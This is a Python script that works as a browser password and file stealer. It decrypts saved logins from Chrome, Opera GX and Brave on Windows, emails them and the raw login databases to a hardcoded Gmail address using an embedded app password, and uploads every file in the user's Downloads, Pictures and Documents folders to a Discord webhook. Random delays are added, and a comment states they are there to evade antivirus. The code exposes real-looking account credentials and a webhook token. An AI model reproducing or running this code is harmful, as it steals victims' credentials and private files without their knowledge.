import os as o
import shutil as sh
import sqlite3 as sq
import json as j
import base64 as b64
from Cryptodome.Cipher import AES as A
from datetime import datetime as d, timedelta as td
import win32crypt as w
import smtplib as sm
from email.mime.multipart import MIMEMultipart as MMP
from email.mime.text import MIMEText as MT
from email.mime.base import MIMEBase as MB
from email import encoders as e
import requests as r
import random as rd
import time as t

def c_date(c_date):
    return d(1601, 1, 1) + td(microseconds=c_date)

def r_key(b_type):
    p = {
        'chrome': o.path.join(o.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State"),
        'opera': o.path.join(o.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State"),
        'brave': o.path.join(o.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
    }
    with open(p[b_type], "r", encoding="utf-8") as f:
        ls = f.read()
        ls = j.loads(ls)
    ek = b64.b64decode(ls["os_crypt"]["encrypted_key"])
    ek = ek[5:]
    dk = w.CryptUnprotectData(ek, None, None, None, 0)[1]
    return dk

def d_pwd(enc_pwd, key):
    try:
        iv = enc_pwd[3:15]
        enc_pwd = enc_pwd[15:]
        c = A.new(key, A.MODE_GCM, iv)
        dec_pwd = c.decrypt(enc_pwd)[:-16].decode()
        return dec_pwd
    except Exception:
        try:
            return str(w.CryptUnprotectData(enc_pwd, None, None, None, 0)[1])
        except:
            return ""

def g_passwords(b_type):
    key = r_key(b_type)
    db_p = {
        'chrome': o.path.join(o.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data"),
        'opera': o.path.join(o.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data"),
        'brave': o.path.join(o.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "default", "Login Data")
    }
    tmp_db = f"{b_type.capitalize()}Tmp.db"
    sh.copyfile(db_p[b_type], tmp_db)
    
    db = sq.connect(tmp_db)
    cur = db.cursor()
    
    cur.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins")
    e = cur.fetchall()
    
    c = f"\n--- {b_type.capitalize()} P ---\n"
    for entry in e:
        o_url = entry[0]
        a_url = entry[1]
        user = entry[2]
        enc_pwd = entry[3]
        pwd = d_pwd(enc_pwd, key)
        d_created = entry[4]
        d_last_used = entry[5]
        
        if user or pwd:
            c += f"Origin URL: {o_url}\n"
            c += f"Action URL: {a_url}\n"
            c += f"Username: {user}\n"
            c += f"Password: {pwd}\n"
        if d_created != 86400000000 and d_created:
            c += f"Creation date: {str(c_date(d_created))}\n"
        if d_last_used != 86400000000 and d_last_used:
            c += f"Last Used: {str(c_date(d_last_used))}\n"
        c += "="*50 + "\n"
    
    cur.close()
    db.close()
    o.remove(tmp_db)
    return c

def email_s(s, s_pwd, r, sub, b_msg, f):
    m = MMP()
    m['From'] = s
    m['To'] = r
    m['Subject'] = sub

    m.attach(MT(b_msg, 'plain'))

    for file in f:
        with open(file, "rb") as at:
            p = MB('application', 'octet-stream')
            p.set_payload((at).read())
            e.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename= {o.path.basename(file)}")
            m.attach(p)

    server = sm.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(s, s_pwd)
    text = m.as_string()
    server.sendmail(s, r, text)
    server.quit()

if __name__ == "__main__":
    all_p_content = ""
    f_attachments = []
    for b_type in ['chrome', 'opera', 'brave']:
        all_p_content += g_passwords(b_type)
        db_p = {
            'chrome': o.path.join(o.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data"),
            'opera': o.path.join(o.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data"),
            'brave': o.path.join(o.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "default", "Login Data")
        }
        f_attachments.append(db_p[b_type])

    with open("pwd.txt", "w", encoding="utf-8") as f:
        f.write(all_p_content)
    f_attachments.append("pwd.txt")
    
    s_email = "napim1996@gmail.com"
    s_app_pwd = "sita yzkv xipc acqf"
    r_email = "ozcanersan1905gs@gmail.com"
    sub = "Extracted Browser Passwords and Cookie Databases"
    b = ("Hello,\n\nPlease find attached the extracted browser passwords and cookie databases from Chrome, "
         "Opera GX, and Brave browsers.\n\nBest regards,\nYour Automated Script")

    email_s(s_email, s_app_pwd, r_email, sub, b, f_attachments)

    o.remove("pwd.txt")

# Webhook URL'sini buraya ekleyin
WEBHOOK_URL = 'https://discord.com/api/webhooks/1214478329181372437/9mD17GWbvyolW3Gn0KXIpsR-28Xb0zHLpwNx365xswxXn6D764KVVaywjy8vVecTzus7'

# Gönderilecek klasörlerin yolları
f_paths = [
    o.path.join(o.path.expanduser("~"), 'Downloads'),  # İndirilenler klasörü
    o.path.join(o.path.expanduser("~"), 'Pictures'),   # Resimler klasörü
    o.path.join(o.path.expanduser("~"), 'Documents')   # Belgeler klasörü
]

# Her bir klasör altındaki dosyaları gönder
for f_path in f_paths:
    # Klasördeki her bir dosyayı gönder
    for root, _, files in o.walk(f_path):
        for fname in files:
            f_path = o.path.join(root, fname)
            try:
                # Dosyayı gönder
                files = {
                    'file': (fname, open(f_path, 'rb'))
                }
                response = r.post(WEBHOOK_URL, files=files)
                if response.status_code == 200:
                    print(f'Dosya başarıyla gönderildi: {f_path}')
                else:
                    print(f'Dosya gönderilirken bir hata oluştu: {response.text}')
            except Exception as e:
                print(f'Hata oluştu: {e}')
            t.sleep(rd.randint(1, 5))  # Rastgele bir bekleme süresi ekleyerek AV tespitini zorlaştırın

